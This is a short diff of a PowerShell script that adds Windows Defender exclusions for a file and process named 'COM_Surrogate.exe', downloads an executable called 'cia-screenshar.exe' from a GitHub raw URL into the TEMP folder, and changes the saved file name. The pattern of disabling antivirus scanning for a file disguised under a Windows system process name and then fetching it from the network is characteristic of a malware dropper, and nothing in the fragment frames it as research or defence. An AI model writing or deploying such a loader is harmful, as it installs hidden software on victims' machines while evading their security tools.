@@ -5,7 +5,7 @@ Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
 Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
 $url = "https://raw.githubusercontent.com/M7mmdddd/psps/refs/heads/main/cia-screenshar.exe"
 
- $output = "$env:TEMP\COM_Surrogate.exe"
+ $output = "$env:TEMP\cia-screenshar.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $output
 
